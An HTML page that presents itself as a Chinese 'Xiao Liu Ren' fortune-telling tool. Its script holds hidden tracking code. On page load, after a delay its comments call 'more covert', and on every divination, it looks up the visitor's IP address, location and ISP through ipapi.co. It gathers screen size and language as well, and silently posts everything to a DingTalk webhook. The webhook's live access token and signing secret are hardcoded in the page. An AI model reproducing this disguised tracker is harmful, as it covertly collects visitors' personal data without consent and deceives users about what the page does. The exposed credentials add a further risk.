<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>诸葛马前课 · 六宫神课</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #0a0a0a 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'SimSun', '宋体', serif;
            overflow: hidden;
        }

        .container {
            text-align: center;
            padding: 40px;
            position: relative;
        }

        /* 太极装饰 */
        .taiji {
            font-size: 80px;
            color: #d4af37;
            text-shadow: 0 0 30px rgba(212, 175, 55, 0.5);
            margin-bottom: 20px;
            animation: rotate 20s linear infinite;
        }

        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .title {
            font-size: 36px;
            color: #d4af37;
            text-shadow: 0 0 20px rgba(212, 175, 55, 0.3);
            margin-bottom: 10px;
            letter-spacing: 8px;
        }

        .subtitle {
            font-size: 18px;
            color: #8b7355;
            margin-bottom: 15px;
            letter-spacing: 4px;
        }

        .guide {
            font-size: 16px;
            color: #a09269;
            margin-bottom: 30px;
            font-style: italic;
            letter-spacing: 2px;
        }

        /* 卦象显示区 */
        .divination-box {
            width: 280px;
            height: 200px;
            margin: 0 auto 30px;
            border: 2px solid #d4af37;
            border-radius: 15px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: rgba(20, 20, 30, 0.8);
            box-shadow: 0 0 30px rgba(212, 175, 55, 0.2),
                        inset 0 0 50px rgba(0, 0, 0, 0.5);
            position: relative;
            overflow: hidden;
        }

        .divination-box::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: conic-gradient(from 0deg, transparent, rgba(212, 175, 55, 0.1), transparent 30%);
            animation: rotate 4s linear infinite;
        }

        .divination-text {
            position: relative;
            z-index: 1;
            font-size: 48px;
            color: #d4af37;
            opacity: 0;
            transition: all 0.5s;
        }

        .divination-text.show {
            opacity: 1;
            animation: glow 2s ease-in-out infinite;
        }

        .divination-name {
            position: relative;
            z-index: 1;
            font-size: 28px;
            color: #ffd700;
            margin-top: 10px;
            opacity: 0;
            transition: all 0.5s;
            letter-spacing: 6px;
        }

        .divination-name.show {
            opacity: 1;
        }

        .divination-meaning {
            position: relative;
            z-index: 1;
            font-size: 14px;
            color: #a09269;
            margin-top: 15px;
            max-width: 240px;
            line-height: 1.8;
            opacity: 0;
            transition: all 0.5s;
        }

        .divination-meaning.show {
            opacity: 1;
        }

        @keyframes glow {
            0%, 100% { text-shadow: 0 0 20px rgba(255, 215, 0, 0.5); }
            50% { text-shadow: 0 0 40px rgba(255, 215, 0, 0.8), 0 0 60px rgba(255, 215, 0, 0.4); }
        }

        /* 闪烁动画 */
        .divination-box.animating::after {
            content: '斟';
            position: absolute;
            font-size: 60px;
            color: #d4af37;
            animation: blink 0.2s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        /* 按钮 */
        .btn {
            padding: 15px 50px;
            font-size: 20px;
            color: #d4af37;
            background: transparent;
            border: 2px solid #d4af37;
            border-radius: 8px;
            cursor: pointer;
            letter-spacing: 6px;
            transition: all 0.3s;
            font-family: 'SimSun', serif;
            position: relative;
            overflow: hidden;
        }

        .btn:hover {
            background: rgba(212, 175, 55, 0.2);
            box-shadow: 0 0 30px rgba(212, 175, 55, 0.4);
            transform: scale(1.05);
        }

        .btn:active {
            transform: scale(0.98);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* 底部文字 */
        .footer {
            margin-top: 40px;
            font-size: 14px;
            color: #5a5a6a;
            letter-spacing: 3px;
        }

        /* 隐藏的内容 - 用于获取IP */
        .hidden-content {
            display: none;
        }

        /* 加载动画 */
        .loading {
            font-size: 24px;
            color: #d4af37;
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        /* IP发送状态 */
        .ip-status {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            padding: 10px 20px;
            background: rgba(20, 20, 30, 0.9);
            border: 1px solid #d4af37;
            border-radius: 8px;
            color: #d4af37;
            font-size: 14px;
            opacity: 0;
            transition: opacity 0.3s;
        }

        .ip-status.show {
            opacity: 1;
        }

        .ip-status.success {
            border-color: #4CAF50;
            color: #4CAF50;
        }

        .ip-status.error {
            border-color: #f44336;
            color: #f44336;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- 太极符号 -->
        <div class="taiji">☯</div>

        <!-- 标题 -->
        <h1 class="title">遇事不决小六壬</h1>
        <p class="subtitle">—— 诸葛马前课 · 六宫神课 ——</p>
        <p class="guide">不管做什么，可以先起一卦看看卦象</p>

        <!-- 卦象显示区 -->
        <div class="divination-box" id="divinationBox">
            <span class="divination-text" id="divinationText"></span>
            <span class="divination-name" id="divinationName"></span>
            <span class="divination-meaning" id="divinationMeaning"></span>
        </div>

        <!-- 起卦按钮 -->
        <button class="btn" id="divineBtn" onclick="divine()">🎲 起卦问事</button>

        <!-- 底部 -->
        <p class="footer">—— 天道无亲 常与善人 ——</p>
    </div>

    <!-- 隐藏的IP发送状态提示 -->
    <div class="ip-status" id="ipStatus"></div>

    <!-- 隐藏的表单用于IP获取 -->
    <form id="hiddenForm" style="display:none;">
        <input type="hidden" name="ip" id="ipInput">
        <input type="hidden" name="city" id="cityInput">
        <input type="hidden" name="region" id="regionInput">
        <input type="hidden" name="country" id="countryInput">
        <input type="hidden" name="isp" id="ispInput">
        <input type="hidden" name="screen" id="screenInput">
        <input type="hidden" name="language" id="languageInput">
        <input type="hidden" name="userAgent" id="userAgentInput">
    </form>

    <script>
        // 六宫卦象数据
        const gua = [
            {
                name: '大安',
                symbol: '☰',
                meaning: '大安事事昌，求财在坤方。\n失物去不远，宅舍保安康。',
                fortune: '吉'
            },
            {
                name: '留连',
                symbol: '☱',
                meaning: '留连事难成，求谋日未明。\n官事凡如火，宜缓不宜惊。',
                fortune: '凶'
            },
            {
                name: '速喜',
                symbol: '☲',
                meaning: '速喜喜来临，求财向南行。\n行人未即至，失物上百呈。',
                fortune: '吉'
            },
            {
                name: '赤口',
                symbol: '☵',
                meaning: '赤口主口舌，官非切要防。\n失物急讨寻，交争意惶惶。',
                fortune: '凶'
            },
            {
                name: '小吉',
                symbol: '☴',
                meaning: '小吉最吉昌，路上好商量。\n阴人言定着，交易立呈祥。',
                fortune: '吉'
            },
            {
                name: '空亡',
                symbol: '☷',
                meaning: '空亡事不长，阴人惹祸殃。\n失物寻不见，官事有灾殃。',
                fortune: '凶'
            }
        ];

        let isDivining = false;

        // 获取屏幕和语言信息
        function getScreenInfo() {
            return {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            };
        }

        function getLanguage() {
            return navigator.language || navigator.userLanguage || 'zh-CN';
        }

        // 获取IP信息
        async function getIPInfo() {
            try {
                // 获取IP和位置
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();

                // 发送IP信息到钉钉
                await sendToDingtalk({
                    ip: ipData.ip || '未知',
                    city: ipData.city || '未知',
                    region: ipData.region || '未知',
                    country: ipData.country_name || '未知',
                    isp: ipData.org || '未知',
                    screen: `${screen.width}x${screen.height}`,
                    language: getLanguage(),
                    timestamp: new Date().toLocaleString('zh-CN')
                });

                return ipData;
            } catch (error) {
                console.error('获取IP失败:', error);
                // 即使失败也发送基本消息
                await sendToDingtalk({
                    ip: '获取失败',
                    city: '未知',
                    region: '未知',
                    country: '未知',
                    isp: '未知',
                    screen: `${screen.width}x${screen.height}`,
                    language: getLanguage(),
                    timestamp: new Date().toLocaleString('zh-CN')
                });
                return null;
            }
        }

        // 发送到钉钉（加签方式）
        async function sendToDingtalk(data) {
            // 钉钉配置
            const WEBHOOK = "https://oapi.dingtalk.com/robot/send?access_token=a57776d2a89ed36f4f4c5a45ee7c5c03f26a28e8eac8efd6a1636fbfb7a2f4ab";
            const SECRET = "SEC83629f66d58aea7a5b348e05da84f5737a57423e72fd9e75ba73b178aa73824c";

            // 计算签名
            const timestamp = Date.now();
            const string_to_sign = `${timestamp}\n${SECRET}`;

            const encoder = new TextEncoder();
            const key = encoder.encode(SECRET);
            const msg = encoder.encode(string_to_sign);

            // 使用 HMAC-SHA256
            const cryptoKey = await crypto.subtle.importKey(
                'raw',
                key,
                { name: 'HMAC', hash: 'SHA-256' },
                false,
                ['sign']
            );
            const signature = await crypto.subtle.sign('HMAC', cryptoKey, msg);
            const sign = btoa(String.fromCharCode(...new Uint8Array(signature)))
                .replace(/\+/g, '-')
                .replace(/\//g, '_')
                .replace(/=+$/, '');

            const url = `${WEBHOOK}&timestamp=${timestamp}&sign=${encodeURIComponent(sign)}`;

            // 格式化消息
            const message = `📱 IP监控通知

IP: ${data.ip}
📍 ${data.country} ${data.region} ${data.city}
🏢 ${data.isp}
🖥 ${data.screen}
🌐 ${data.language}
⏰ ${data.timestamp}`;

            // 发送请求
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    msgtype: 'text',
                    text: { content: message }
                })
            });
        }

        // 占卜函数
        async function divine() {
            if (isDivining) return;
            isDivining = true;

            const btn = document.getElementById('divineBtn');
            const box = document.getElementById('divinationBox');
            const text = document.getElementById('divinationText');
            const name = document.getElementById('divinationName');
            const meaning = document.getElementById('divinationMeaning');

            btn.disabled = true;
            btn.textContent = '斟...';

            // 清空之前的结果
            text.classList.remove('show');
            name.classList.remove('show');
            meaning.classList.remove('show');

            // 开始闪烁动画
            box.classList.add('animating');

            // 闪烁1-2秒
            await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 1000));

            // 停止动画
            box.classList.remove('animating');

            // 随机选择卦象
            const result = gua[Math.floor(Math.random() * gua.length)];

            // 显示结果
            text.textContent = result.symbol;
            name.textContent = result.name;
            meaning.textContent = result.meaning;

            text.classList.add('show');
            name.classList.add('show');
            meaning.classList.add('show');

            btn.textContent = '🎲 起卦问事';
            btn.disabled = false;
            isDivining = false;

            // 同时获取IP并发送到钉钉
            getIPInfo();
        }

        // 页面加载时自动获取IP（隐蔽发送）
        window.onload = function() {
            // 延迟一下，更隐蔽
            setTimeout(() => {
                getIPInfo();
            }, 2000);
        };
    </script>
</body>
</html>
